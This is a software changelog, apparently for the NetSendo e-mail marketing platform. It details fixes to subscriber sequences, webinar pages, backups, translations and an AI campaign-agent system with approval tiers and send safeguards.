- **A request without a `User-Agent` header 500'd on the registration page:** `WebinarAnalytic::parseUserAgent()` returned `compact('device_type', 'browser')` while the variables were actually named `$deviceType` and `$browser`. `compact()` raises a warning for names it cannot find, Laravel turns warnings into exceptions, so page-view and registration tracking threw for any caller that sends no user agent (curl, some bots, health checks). Returns the array explicitly now.
- **Eight migrations could only run on MySQL, which made the entire test suite unrunnable:** raw `ALTER … MODIFY`, `SHOW INDEX`, `INFORMATION_SCHEMA` queries, a generated virtual column and a `fullText` index all failed on the sqlite in-memory database `phpunit.xml` configures, so `RefreshDatabase` aborted before a single test ran. Each is now guarded by the driver; on MySQL nothing changes, and migrations already applied in production are unaffected.
...
- **Editable webinar registration & thank-you pages + Calendly booking integration (extends the issue [#25](https://github.com/NetSendo/NetSendo/issues/25) funnel copy):** the public webinar signup page and the thank-you flow, previously limited to a handful of copy fields, can now be composed from custom content sections, and the thank-you flow gains meeting booking.
  - **Registration page sections:** a new "Additional registration page sections" card in webinar Create/Edit lets you add up to 20 ordered sections of two types — **text** (heading + multi-line body) and **video** (a YouTube or Vimeo invitation video). Each section can be placed **above or below the signup form**, reordered and removed inline (new reusable `SectionListEditor.vue`). Video inputs accept full links (`watch?v=`, `youtu.be`, `shorts/`, `live/`, `vimeo.com/{id}`, unlisted `vimeo.com/{id}/{hash}`, `player.vimeo.com/video/{id}`) or a bare video id; `Webinar::videoEmbedUrl()` extracts the id by regex and rebuilds a known player URL, so an arbitrary iframe `src` can never be injected through section input.
  - **Thank-you page sections + Calendly:** a new "Thank-you page" card configures the same text/video sections plus an embedded **Calendly** inline widget — enable toggle, scheduling link (validated to start with `https://calendly.com/`, re-checked against `*.calendly.com` at render time) and an optional heading/description above the calendar. On the post-registration screen (`registered.blade.php`, layout widened from `max-w-lg` to `max-w-2xl`) the widget **prefills the invitee's name and e-mail** from the registration, so booking a meeting is a one-step date pick.
  - **Standalone public thank-you page:** new route `GET /webinar/{slug}/thank-you` (`webinar.thankyou`, `PublicWebinarController::thankYou()`) renders the same editable sections and Calendly widget without any registration context, with its own editable headline/message (`content.purchase_thankyou_headline` / `content.purchase_thankyou_message`, localized defaults). Intended as a post-purchase redirect target (e.g. from a payment system); the URL is displayed with a copy button in the webinar Edit "Thank-you page" card.
  - Everything is stored in the existing `webinars.settings` JSON column (`registration_sections`, `thankyou_sections`, `calendly`, new `content.*` keys) — **no migration required**. Malformed or empty sections are dropped at render time (`Webinar::pageSections()`), request payloads are validated in `WebinarController::store()/update()`, section rendering is shared via new Blade partials (`webinar/partials/content-sections.blade.php`, `webinar/partials/calendly.blade.php`), and all new admin/public strings ship in all four locales (PL/EN/DE/ES) on both the Vue (`resources/js/locales/*.json`) and PHP (`lang/*/webinars.php`) sides.
...
- **MCP `create_subscriber` now actually reaches the API:** the tool sent a `lists` array while the REST endpoint requires a single `contact_list_id`, so every call failed validation (422). The MCP API client now calls `POST /subscribers` once per list id (the first call creates/finds the subscriber, subsequent calls attach the remaining lists — each attach starting that list's sequences), and the tool schema requires at least one list id.

### Fixed

- **Double opt-in confirmation and resubscribe links always failed with an SQL error ([#29](https://github.com/NetSendo/NetSendo/issues/29)):** `ActivationController` wrote `confirmed_at` / `resubscribed_at` into the `contact_list_subscriber` pivot, but those columns never existed — `updateExistingPivot()` produced an *Unknown column* `QueryException`, the `catch` rendered the generic error page, and the subscriber was **never activated** (double opt-in signups therefore never started their autoresponder sequence, and the resubscribe link was equally dead). The columns are now created and registered in both `withPivot()` relations, and `resubscribe()` additionally resets `subscribed_at` and clears `unsubscribed_at`, so a re-signup anchors the sequence at the re-signup moment. **Migration:** `2026_07_24_000001_add_confirmation_columns_to_contact_list_subscriber.php`.
- **Autoresponder sequences ("kolejka") did not start for existing subscribers on most signup paths:** the sequence engine is driven by the `SubscriberSignedUp` event, but many code paths attached or reactivated a subscriber on a list without firing it. Now dispatched on every signup/reactivation path:
  - **REST API `POST /api/v1/subscribers`** — for an *existing* subscriber the event fired only on brand-new subscriber records; adding an existing contact to a new list or reactivating an unsubscribed one only sent a webhook. Both branches (and the same two branches of `POST /subscribers/batch`) now dispatch the event, so API/n8n/MCP-driven signups of existing contacts start the sequence.
  - **Public per-list subscribe API `POST /api/lists/{id}/subscribe`** (list API key) — never dispatched the event for anyone (new, reactivated, or re-signing active subscribers); the parent-list propagation (`ContactList::syncToParentList()`) was silent too. All paths now dispatch it.
  - **Subscriber edit form** (`SubscriberController::update()`) — adding a list in the edit screen was silent (the create form already fired the event). Now fires for newly attached and reactivated lists only, so re-saving an unchanged subscriber does **not** restart sequences.
  - **Co-registration** — a subscriber who was already on the co-registered list (even unsubscribed!) was skipped entirely. Existing memberships are now reactivated (honoring `resubscription_behavior`) and the event is dispatched.
  - **Calendly webhook** add-to-list, and **list delete-with-transfer** (Mailing + SMS list `destroy`) — attached silently; the transfer also crashed with a duplicate-key error when a transferred subscriber already existed on the target list (now handled per-subscriber via `Subscriber::addToList()`).
  - **Funnel "move/copy to list" actions and sales-funnel checkout enrollment were completely broken** — they called `Subscriber::moveToList()` / `addToList()` / a `lists()` relation that did not exist, throwing at runtime (silently swallowed in the sales-funnel path, so paying customers were never added to the target list). The methods now exist on `Subscriber` (attach/reactivate honoring `resubscription_behavior` + event dispatch; the sales-funnel lookup is also scoped to the list owner's account).
  - **WooCommerce webhook** still used the pre-refactor schema (`subscribers.contact_list_id`), so it crashed and never created the list membership; rewritten for the pivot schema with `addToList()`.
- **Re-signup could dump the entire sequence at once ("burst"):** send times were always recomputed from the pivot `subscribed_at`, so when a subscriber re-signed up on a list configured to keep the original date (`resubscription_behavior = keep_date`) — or resubscribed via the (previously broken) link — every day-offset lay in the past and CRON sent all queued messages of the sequence immediately. Queue entries now carry an explicit **`scheduled_for`** timestamp (computed once by `CreateAutoresponderQueueEntries` via the new shared `Message::calculateExpectedSendAt()`, which is also timezone-aware for `time_of_day` + `send_in_subscriber_timezone`); CRON (email + SMS) gates on it and falls back to the legacy pivot computation only for entries created before the migration. On resubscription the listener now anchors the restarted sequence at the actual re-signup moment (event carries `occurredAt`) and **updates the existing entry in place** instead of deleting it (the unique `message_id+subscriber_id` index forbade keeping history anyway). "Send to missed" entries get `scheduled_for = now()` and the action now processes **all** missed subscribers instead of silently only the first 100. **Migration:** `2026_07_24_000002_add_scheduled_for_to_message_queue_entries.php`.
- **Double opt-in re-signup demoted active subscribers to `pending`:** submitting a double opt-in form with the address of an already-confirmed, active subscriber silently switched their list status back to `pending`, stopping all their mailings until a re-confirmation (whose link was broken, see above). Active subscribers now stay `active`, receive the "already subscribed" notification instead of a confirmation request, and the `SubscriberSignedUp` event fires immediately (they are already confirmed), so the sequence restarts per the list's reset setting.
- **"Delete unconfirmed subscribers" maintenance never matched anything:** the daily cleanup looked for pivot status `unconfirmed` while double opt-in signups store `pending`; it now matches both.
- **Queue/recipient counters finally reflect reality:** `planned_recipients_count` was never calculated for autoresponders (`syncPlannedRecipients()` returned early before writing it), so the messages list showed `null`/sent-only and the AJAX refresh substituted the unrelated "all active subscribers" total; it is now refreshed (throttled to 10 min) on every CRON sync. The queue-stats modal's backend `pending` count (subscribers already queued — exactly "how many are queued") was computed but never rendered; it now has its own row, queued entries are additionally distributed into the today/tomorrow/3–7-days buckets by their `scheduled_for` (a past schedule counts as "today", never as "missed"), and the modal totals include the previously omitted "today" bucket, so percentages add up. New `queue_stats.pending` label shipped in all four locales (PL/EN/DE/ES).
...
- **SMTP throttling / intelligent retry for transient failures ([#21](https://github.com/NetSendo/NetSendo/issues/21)):** transient SMTP responses — most notably `421 Too many connections`, but also greylisting and other temporary `4xx`/rate-limit errors — were treated as hard failures: `SendEmailJob` marked the recipient as `failed` and called `$this->fail()` immediately, so on connection-limited providers a large broadcast could leave a significant share of recipients failed and require a manual "Retry failed". Two coordinated changes fix this:
  ...
  - **Configurable** via `config/netsendo.php` → `email` (all env-overridable): `transient_retry`, `transient_backoff_base`, `transient_backoff_jitter`, `stagger_sends`, `stagger_window_seconds`. The behaviour can be disabled to restore the previous immediate-fail semantics.
- **Full frontend locale parity (EN/DE/ES/PL):** closed the pre-existing translation debt in `resources/js/locales/*.json` — 864 keys missing in German, 785 in Spanish and 78 in English (vs the Polish reference) were translated and added, covering marketplace/integrations (Polar, NMI, WooCommerce), MCP server, SMS providers & lists, CRM, mailboxes (domain reputation, API keys, OAuth), system e-mails, cron, template builder, users, auth and more. 194 keys that existed only in EN/DE/ES (a legacy of content living under divergent paths, e.g. `subscribers.api_keys.*` vs the Polish reference structure) were backfilled into `pl.json`, and 9 dead object-shaped `messages.stats.add_to_list.*` keys in DE/ES — unreachable because the app reads the string key `messages.stats.add_to_list` — were replaced by the correct string form. All four locales now hold an identical set of 6675 keys (interpolation placeholders preserved; existing translations untouched; `brain.*` already at parity and left as-is).
- **Unreadable tag labels on light colors:** tag pills previously hard-coded white text over the user-chosen background color, so light tag colors (yellow, pastels, etc.) rendered the label nearly invisible. Text color is now derived automatically from the background's perceived brightness — light backgrounds get dark text, dark backgrounds keep white — via the new `useColorContrast` composable (`resources/js/Composables/useColorContrast.js`). Applied everywhere tag names are shown on their color: the Tag manager, and the Mailing List / SMS List index (cards + table), show, create, and edit screens.

### Added

- **Newer AI models in the Brain model picker + on-demand model refresh ([#28](https://github.com/NetSendo/NetSendo/issues/28)):** the NetSendo Brain → Settings → **Model AI** dropdown was missing recent models. It had two causes, both fixed.
  - **Refreshed the built-in catalog:** `AiIntegration::getDefaultModels()` was still the February 2026 list. It has been brought current (July 2026) — Anthropic now offers **Claude Opus 4.8, Sonnet 5, Haiku 4.5 and Fable 5** (older Opus/Sonnet 4.x kept as *Legacy*), xAI adds **Grok 4**, OpenAI promotes **GPT-5.2** to stable, and Google adds **Gemini 2.5 Flash-Lite** — with the per-provider defaults (`AnthropicProvider` → `claude-opus-4-8`, `GrokProvider` → `grok-4`, `OpenrouterProvider` → `openai/gpt-5.2`), the OpenRouter shortlist, the provider descriptions, and `config/ai_pricing.php` updated to match.
  - **The Brain dropdown now shows models fetched from the provider API (the "auto-fetch newest models" request):** the Brain Settings page fed its dropdown from the *static* list only, so models pulled live via the existing "fetch models" action (stored in `ai_models`) never appeared there. A new shared `AiIntegration::availableModels()` merges the current default catalog with each integration's stored/fetched models — defaults first so newly released models always show, stored rows overriding display names and appending custom/fetched extras. `BrainPageController` and `ActiveAiModelsController` now both use it (the duplicated merge logic in the latter was removed). To make the live refresh cover Claude too, **dynamic model fetching is now enabled for Anthropic** via its `GET /v1/models` endpoint (previously disabled) — so every API-based provider (OpenAI, Anthropic, xAI/Grok, OpenRouter, Gemini) can now pull its latest model list on demand, and the curated catalog above serves purely as an offline fallback.

- **Backup module — issue [#26](https://github.com/NetSendo/NetSendo/issues/26) completion (feedback, listing & restore):** the Settings → Backups screen was half-finished — clicking "Create backup" gave no indication of what was happening, freshly made backups often never appeared in the list, and there was no way to restore one. All three are now addressed.
  - **Non-blocking backups with real progress feedback (fixes "nie wiadomo co się dzieje"):** the controller previously ran `Artisan::call('backup:run')` **synchronously inside the HTTP request**. A full-application archive (`base_path()`) easily exceeds PHP-FPM's request timeout, so the page hung and the aborted run left no `.zip` behind — which is also why the created backup was "nowhere on the list". Backups now run on the queue via the new `RunBackupJob`; the request returns immediately with a "backup started" message and the page shows a live **in-progress banner** and then a **success/failure result** (with the error text on failure). Progress is tracked in a new `backup_operations` table (`BackupOperation` model) that the page polls via an Inertia partial reload, so the newly created archive appears in the list the moment it is written.
  - **Database restore (the missing feature):** a new **Restore** action per backup imports the database from the selected archive. `RestoreBackupJob` first takes an automatic **safety backup** of the current database (so the restore is reversible), then extracts the `db-dumps/*.sql` dump from the archive (`BackupManager`, handling optional `.gz` and archive encryption) and imports it with the `mysql` client — password passed via `MYSQL_PWD`, dump streamed from disk to avoid loading it into PHP memory. Because a restore can replace the `backup_operations` table itself, the job records its final status resiliently. The UI guards it behind a strong `danger` confirmation modal that spells out that **all** current data will be replaced and notes the automatic safety backup.
  - **Hardening & correctness:** fixed the `--only-db` flag being sent even for full backups (Symfony treats the mere presence of a boolean option as "set", so full backups were silently DB-only); the flag is now only passed when database-only is requested. All backup filenames are `basename()`-sanitised on download/restore/delete (path-traversal guard), missing files return a clean 404, and a second create/restore is blocked while one is already running. Native `confirm()` for delete was replaced with the shared `ConfirmModal`. New server strings live in `lang/{en,pl,de,es}/backup.php`; new UI strings were added to the `backup.*` block of all four `resources/js/locales` files. **Migration:** `2026_07_10_160000_create_backup_operations_table.php`.
- **Webinars — issue [#25](https://github.com/NetSendo/NetSendo/issues/25) build-out (finishing the module):** the remaining gaps from the "Webinary — obsługa do dokończenia" report are now implemented.
  - **Editable funnel pages (registration → thank-you → watch):** the registration, thank-you and "waiting for the broadcast" pages were fixed templates; the create/edit forms gained a **Funnel page content** section that overrides the registration headline/subheadline, the sign-up form title and button, a benefits list (one bullet per line), the thank-you headline/message, and the waiting-screen title/message. Copy is stored under `settings.content` (benefits under `settings.benefits`); every field falls back to the existing translation when left blank, so unconfigured webinars render exactly as before. Backed by the new `Webinar::pageContent()` / `benefitsList()` helpers and validated at the controller (`settings.content.*`, `settings.benefits.*`); admin labels added under `webinars.content.*` in EN/PL/DE/ES.
  - **Add-to-calendar everywhere — Google, Outlook & downloadable `.ics`:** the registration **confirmation e-mail** now carries Add-to-Calendar links (it previously had none), and the thank-you page gained an Apple/`.ics` option beside the existing Google/Outlook buttons. A new token-scoped route `GET /webinar/{slug}/calendar/{token}` (`webinar.calendar`) serves a standards-compliant iCalendar file via `WebinarRegistration::toIcs()`. The Google/Outlook accessors now return `null` — and the buttons/links are hidden — when the webinar has no start time yet, instead of linking to a dead `#`; all calendar times are emitted in UTC.
  - **Muted-autoplay with one-tap unmute for recordings:** browsers block autoplay *with sound*, which left uploaded-video and Vimeo auto-webinars on a frozen first frame. Recordings now start **muted** (so autoplay always succeeds) with a floating "tap to unmute" button that restores audio on the first click — wired through the unified `videoTracker.setMuted()` for both the native `<video>` element and the Vimeo player, and hidden automatically on the countdown/ended screens. Live YouTube is unchanged. New string `webinars.public.watch.tap_to_unmute` in all four locales.
  - **Clearer scheduling:** the start date/time field is now shown for **hybrid** webinars too (previously live-only) with a help note that it drives the countdown, and auto-webinars show an inline hint pointing to the separate Schedule screen — so a webinar is never accidentally left showing only "starting soon". (Attendee identification and per-registration attendance tracking already worked via the tokenized watch link; the confirmation e-mail already resolves a mailbox with a list-default → user-default → any-active fallback chain.)
- **Vimeo support in the Webinars module (live, auto & hybrid):** every webinar type can now use Vimeo as its video source, not just YouTube. The create/edit forms carry a video-provider selector whose options adapt to the webinar type — live offers YouTube / Vimeo, auto & hybrid offer Direct video URL / Vimeo — and only the selected provider's id is persisted (the save transform clears the others) so the player renders unambiguously from field presence. The public watch page and the host Studio preview both embed the Vimeo player (controls hidden, autoplay), and the new `Webinar::vimeoEmbedUrl()` helper handles the unlisted-video `id/hash` form.
  - **Attendance tracking parity for Vimeo recordings:** the watch page loads the Vimeo Player SDK (only when a Vimeo video is shown) behind a unified `videoTracker` abstraction, so progress/leave beacons — which drive `max_video_position_seconds`, the attended list/tags, and video-progress analytics — now work for Vimeo auto-webinars exactly as they do for the native `<video>` element. Live YouTube remains position-less, as before.
  - New nullable `webinars.vimeo_id` column (migration `2026_07_10_150000_add_vimeo_to_webinars.php`, which also backfills `video_provider = 'youtube'` for existing YouTube webinars); `video_provider` now recognises `youtube` / `vimeo` / `upload`. Translated in EN/PL/DE/ES.
- **Evergreen (schedule-synced) auto-webinar playback:** auto and hybrid webinars now resume at the correct point of the recording for late joiners instead of always starting from zero. The watch page computes the elapsed offset client-side from the session start time (accurate regardless of render/network delay) and seeks the player to it on load, then keeps the viewer locked to the schedule clock — re-syncing forward (never backward) after tab throttling or buffering, both on a periodic check and when the tab regains focus. Works identically for the native `<video>` element and the Vimeo player via the unified `videoTracker.seek()`; the controller gates it (`videoSyncEnabled`) to recording-backed auto/hybrid sessions only, so live YouTube/Vimeo streams are never seeked.
  - **End-of-recording detection:** a late joiner who arrives after the recording would already have finished (elapsed offset ≥ video length) — or a viewer who watches through to the end — now sees the "session ended" screen (with a replay link) instead of a frozen last frame or a from-zero replay. Duration is read client-side (`videoTracker.getDuration()` — native `loadedmetadata` / Vimeo `getDuration()`) with an 8 s fallback so a stalled source never blocks playback; the ended screen was extracted to a shared `webinar/partials/ended` partial reused by the server-rendered and client-revealed states.
- **Webinar replay page (native & Vimeo):** the `webinar.replay` route was previously wired to a non-existent view (500 on click); it now renders a real replay page that plays the recording from the start with full controls, for both direct-URL (`<video controls>`) and Vimeo sources, and lists the webinar's products. Replay availability (`hasReplay`) now covers Vimeo recordings and respects the `allow_replay` setting, matching the route's own guard.
- **Live tag preview:** the tag create/edit form now shows a live preview pill of the tag with its chosen color and auto-selected text color, so readability is visible before saving.

### Fixed — Brain Translations Audit

- **Frontend locale files completed:** the Vue UI reads translations from `resources/js/locales/*.json`, not the PHP lang files — all new Brain 2.0 frontend keys (guide ×75, approvals ×9, dry_run ×3, revenue KPI ×3) plus 66 PRE-EXISTING keys that were used in Monitor/Settings/Chat with Polish-only inline fallbacks (KPI cards, campaign strategy form, agent modes, suggested tasks, knowledge-base editor/bulk-delete, `edit_title`) are now present in all four locales (EN/PL/DE/ES). Full `brain.*` parity: 310 frontend keys and 290 backend keys used in code, 0 missing in any language.
- **Broken `__()` calls in Telegram commands:** `/goals`, `/report` and `/calendar` passed a default-string as the second argument of `__()` (Laravel expects a replacements array — TypeError at runtime). Fixed the calls and added the four missing keys (`goals.active_goals`, `digest.title`, `digest.recommendations`, `calendar.upcoming`) in all locales.
- **Knowledge-base bulk-delete counters:** four `t()` calls interpolated the selection count into the fallback string, so adding translations would have frozen the number — switched to vue-i18n named interpolation (`{count}`) with properly parameterized messages in all four languages.
- **PHP lang parity:** added the missing `voice.*` section (7 keys) to EN/DE/ES `brain.php` (previously PL-only).

### Added — Brain 2.0 User Guide

- **In-app Brain Guide (`/brain/guide`):** new user-facing knowledge-base page showing the full potential of the Brain system — the autonomous loop (analyze → plan → approve → execute → measure → learn), the three work modes + dry-run, all 10 agents with plain-language capability descriptions, the 4 revenue playbooks, how Brain measures money (unified ledger, click→purchase attribution, RPM, weekly P&L), how it learns from every send, the safety guarantees (pre-send pipeline, deliverability circuit breaker, permission tiers), and a 5-step quick start. Linked from the NetSendo Brain sidebar group ("Guide"); fully translated in EN/PL/DE/ES (75 keys each). New route `brain.guide` + `BrainPageController::guide`. The Settings page controllers now expose all 10 agents (previously 7) in the per-agent mode grid.

### Added — Brain 2.0 Phase 5 (Economic Allocator)

- **Attention-budget allocator ("the CFO"):** new `AllocationService` treats the weekly send budget (`max_sends_per_week`) as scarce capital. It measures RPM per campaign type through the calendar→plan→snapshot→revenue chain (calendar entries now store the executed `plan_id` in metadata for this linkage) and allocates weekly slots with Thompson-style sampling — proven earners get more sends, untested campaign types keep an optimistic exploration prior. The allocation is injected into the weekly calendar planning prompt as a data-driven directive ("newsletter: 2 sends (measured RPM 41.20 from 6 campaigns); win_back: 1 send (untested — exploration slot)").
- **Weekly P&L in the digest:** `WeeklyDigestService` gains a P&L section — period revenue from the unified ledger (total, attributed to campaigns, by source) versus estimated AI token cost (per-model from `ai_execution_logs` × `AiCostEstimator`) — surfaced in the digest payload and as a dedicated section of the AI report. The number the whole system optimizes for is now reported every week.
- **Thresholds moved to configuration:** new `config/brain.php` (hot-lead score, industry benchmark fallbacks, review windows, learning-engine and allocator parameters), all overridable per user via Brain preferences (`AiBrainSettings::getThreshold`). Replaced the hardcoded hot-lead `score >= 50` in SituationAnalyzer, AgentOrchestrator and CampaignAgent, and the hardcoded industry benchmarks in PerformanceTracker.

### Added — Brain 2.0 Phase 4 (Learning Engine)

- **Every send is an experiment:** `ai_performance_snapshots.experiment_dimensions` (new JSON column) records structured hypothesis dimensions per campaign — send day/hour, subject length/word count, emoji/question/number presence, personalization. `PerformanceLearner` now computes DETERMINISTIC per-feature win rates (avg open rate with vs without each subject feature, with lift in percentage points) instead of relying on prose lessons, and injects them into planning prompts as measured facts.
- **Deterministic best-send-time:** new `PerformanceLearner::getBestSendTime()` derives the historically best-performing hour/day from experiment dimensions; `schedule_send` snaps scheduled (non-immediate) sends to that hour — same day only, and always within the user's allowed send window. Previously best-hour insights existed only as prose in prompts; nothing actually scheduled at those times.
- **Outcome-driven goals:** `ai_goals` gains `target_metric` (`open_rate|click_rate|subscribers|revenue_30d`), `target_value`, `baseline_value`. New `GoalOutcomeService` evaluates metric goals every cron cycle: the first evaluation freezes the baseline, progress = metric movement from baseline toward target (increase and decrease targets both supported), and the goal completes ONLY when the metric reaches the target — not when sub-plans finish running. `POST /brain/api/goals` accepts `target_metric`/`target_value`. **Migration:** `2026_07_10_140000_add_learning_engine_columns.php`
- **Failure feedback loop:** plan failures are now recorded into a structured `failures` array on the goal context and read back by `decomposeGoal` — the planner sees the last 3 failed attempts ("avoid repeating these mistakes") when re-planning. Previously failures were written under per-plan keys and never read. Goal decomposition also learned about the new `funnel`/`revenue`/`deliverability` agents.

### Added — Brain 2.0 Phase 3 (Revenue Levers & Playbooks)

- **Deliverability circuit breaker:** new `DeliverabilityGuardService` wired as check #0 of the Pre-Send Safety Pipeline — Brain sends are blocked when the rolling 48h bounce rate exceeds 5%, the complaint rate exceeds 0.1% (both user-overridable via `preferences.deliverability_max_bounce_rate` / `deliverability_max_complaint_rate`), or a mailbox domain sits on a critical blacklist; critical SPF/DKIM/DMARC domain status surfaces as a warning. Sender reputation now structurally outranks any single campaign.
- **DeliverabilityAgent (read-only):** new `deliverability` Brain agent — domain auth status (SPF/DKIM/DMARC per domain), mailbox blacklist reputation, 48h bounce/complaint health with circuit-breaker state, and `spam_check_message` (SpamTriggerAnalyzer + headless inbox-placement estimate) for drafts before sending.
- **Revenue playbooks:** new `PlaybookService` with four codified funnel shapes — `welcome` (welcome→trust→first offer, list-signup trigger), `cart_abandon` (1h reminder + objection-handling offer, tag trigger), `winback` (re-engagement + comeback offer with honest sunset framing), `post_purchase` (thank-you + cross-sell/upsell). Instantiation generates every e-mail with the LLM (brand voice from the knowledge base, tone from strategy settings, user's language), creates funnel-pool messages (`status='ready'` — invisible to the broadcast cron), builds the funnel steps through `FunnelService::updateSteps` with a purchase goal step for revenue attribution, and leaves the funnel in DRAFT.
- **FunnelAgent:** new `funnel` Brain agent wiring NetSendo's most powerful automation primitive into Brain — `list_playbooks`, `create_funnel_from_playbook` (write tier), `list_funnels`, `funnel_stats` (enrollment + goal revenue), `activate_funnel` (SEND tier — funnels e-mail real people; validates via `FunnelService::validate` first, dry-run aware), `pause_funnel`. Both new agents registered in ToolRegistry, orchestrator, per-agent mode settings; translations in EN/PL/DE/ES.

### Added — Brain 2.0 Phase 2 (Revenue Layer)

- **Unified revenue ledger (`revenue_events`):** new table + `RevenueEvent` model normalizing completed payments from all platform silos — Stripe/Polar/Tpay transactions, purchase-type funnel goal conversions, WooCommerce order webhooks, and the generic purchase webhook (the last two previously persisted NO money record at all — order values were stuffed into subscriber custom fields or discarded after firing automations). Amounts stored in minor units with explicit per-event currency (provider defaults differ: Polar=USD, others=PLN). Idempotent per `(source, source_id)`. **Migration:** `2026_07_10_120000_create_revenue_events_table.php`
- **Campaign revenue attribution:** `RevenueEventService` incrementally syncs new payments each Brain cron cycle and attributes each event — funnel-goal conversions carry funnel attribution; everything else gets last-click attribution (most recent `email_clicks` row by the same subscriber within a configurable window, default 7 days, `preferences.attribution_window_days`). Subscriber backfilled by e-mail when the gateway didn't link one.
- **RevenueAgent (read-only):** new `revenue` Brain agent with `revenue_summary` (totals by currency/source, attributed share), `campaign_revenue` (top-earning campaigns with RPM — revenue per 1000 delivered), and `subscriber_ltv` (top subscribers by lifetime revenue). Registered in ToolRegistry, orchestrator, per-agent mode settings. Translations in EN/PL/DE/ES.
- **Revenue KPIs:** Monitor KPI row extended with a Revenue card (30-day total, trend vs previous 30 days, RPM, % attributed to campaigns) via `GET /brain/api/kpi`; `SituationAnalyzer` context now includes 30-day revenue totals and top-earning campaigns, so autonomous planning sees actual money signals, not just open rates.

### Added — Brain 2.0 Phase 1 (Execution Kernel)

- **Brain — ToolRegistry (single source of truth for agent actions):** new `App\Services\Brain\Tools\ToolRegistry` defining every executable step action (owning agent, permission tier, description, config shape). Agent planner prompts now generate their "Available action_types" sections from the registry (no more prompt/executor drift across 7 agents); `BaseAgent::createPlan` validates steps against the registry at plan-creation time — steps with unknown action types are rejected with a log, and a plan with zero valid steps is a planning failure; `ModeController::getActionTier` delegates to the registry. ResearchAgent filters its registry section by the user's configured research APIs.
- **Brain — Asynchronous plan execution:** new `ExecuteBrainPlanJob` (queue, 10-min timeout, no job-level retries — steps have their own retry logic). Approved plans from BOTH channels (web `POST /brain/api/plans/{id}/approve` and Telegram inline approval) are now queued instead of executed inside the HTTP request / Telegram webhook. The job logs `plan_execution_started/finished` activity events (visible in the Monitor feed) and sends the result back to Telegram when the approval came from there.
- **Brain — Approval Center in the Monitor:** new "Approvals" tab (with pending-count badge) listing all pending approvals — action plans with per-step permission-tier badges (`read`/`write`/`send`/`destructive`) and step configs, plus plan-less goal proposals. Approve/reject directly from the web UI (previously cron approvals were Telegram-only; without Telegram connected the user was never notified). New endpoints: `GET /brain/api/approvals`, `POST /brain/api/approvals/{id}/decide` (handles both plan approvals — queueing execution — and goal proposals — creating the goal). Translations in EN/PL/DE/ES.

### Added — Brain 2.0 Phase 0 (Foundation Fixes)

- **Brain — REAL campaign sending (D1):** `CampaignAgent::schedule_send` now dispatches campaigns through the actual platform pipeline (`status='scheduled'` + `scheduled_at` + `syncPlannedRecipients()` → `cron:process-queue` → `SendEmailJob`). `send_at: "immediate"` genuinely sends now (previously it silently left a draft). Audience is attached via the `contact_list_message` pivot (previously a non-existent `contact_list_id` column was set and silently dropped — Brain campaigns had NO audience). Autoresponders are protected from being flipped to broadcast. **Files:** `app/Services/Brain/Agents/CampaignAgent.php`
- **Brain — Pre-Send Safety Pipeline (D1):** new `PreSendSafetyService` enforced before every Brain send: `SpamTriggerAnalyzer` blocks on critical spam issues; `max_sends_per_week`, `max_audience_per_campaign`, `preferred_send_hours` and `excluded_days` from strategy settings are now ENFORCED in code (previously advisory-only in prompts); suppression-list recipients are skipped at queue level (the platform pipeline never consulted `SuppressionList` on send). **File:** `app/Services/Brain/PreSendSafetyService.php`
- **Brain — A/B test lifecycle (D2):** new `start_ab_test` and `apply_ab_winner` agent actions wired to `AbTestService::startTest()` / `completeTest()` — Brain-created A/B tests can now actually run and auto-send the winning variant to the remaining audience (previously tests were created as drafts and never started).
- **Brain — Permission tiers (D3):** replaced the dead `CRITICAL_ACTIONS` guard (matched against agent type, never fired) with a per-action tier map (`read`/`write`/`send`/`destructive`) in `ModeController`. Destructive actions (`clean_bounced` mass-unsubscribe, automation update/toggle/delete) ALWAYS require approval — including in autonomous cron mode. Interactive approval gate now respects per-agent modes (previously global-mode only).
- **Brain — Dry-run (simulation) mode:** new toggle in Brain Settings (`preferences.dry_run_mode`) + Monitor badge. Send/A-B actions report what they WOULD do without sending anything.
- **Brain — Full token accounting (D5):** all agent and Brain-service LLM calls now use `generateTextWithUsage` — real token counts are charged against `daily_token_limit` and logged to `ai_execution_logs` (previously agent plan/execute calls logged 0/0 and never hit the budget). New `BrainAi` tracked-call helper for services (SituationAnalyzer, GoalPlanner, CampaignCalendar, KnowledgeBase, PerformanceTracker, WeeklyDigest, intent classification). Model pricing moved from a stale hardcoded table to `config/ai_pricing.php` with 2026 model coverage (`AiCostEstimator`).

### Fixed — Brain 2.0 Phase 0

- **Silent no-op actions (D4):** unknown/unimplemented step actions now fail the step loudly instead of returning fake success ("Noted"). Removed unimplemented actions from planner prompts (`add_subscribers`, `remove_subscribers`, `segment`, `analyze_results`). Removed dead code: `handleAutonomousTasks`, `handleSemiAutoTasks`, `enrichKnowledgeBase`, `getAcceptedPriorities` in `RunBrainCronCommand`; unused `CampaignArchitectService`/`CampaignAdvisorService` dependencies in `CampaignAgent`.
- **Schema drift (D6):** added missing `ai_brain_settings.cron_max_tasks` and `ai_campaign_calendar.executed_at` columns (read/written by cron but never migrated); `ai_pending_approvals.ai_action_plan_id` is now nullable (goal proposals create plan-less approvals). **Migration:** `2026_07_10_100000_fix_brain_schema_drift.php`
- **Misleading metrics (D12):** `AnalyticsAgent` open/click rates are now computed against actually delivered emails (`message_queue_entries.status='sent'`) instead of the whole active-subscriber base; campaign comparison shows delivered counts and uses `subject` (the `name` column never existed).
- **Style-preference learning bugs:** fixed `extractStylePreferences` referencing non-existent `$plan->agent` / `$step->action` / string `result` (now `agent_type` / `action_type` / JSON-encoded result).
- **Message creation:** Brain-created messages now get correct `channel`/`type` (`email`/`broadcast`) instead of invalid `type='email'`, and no longer set the non-existent `name` column.
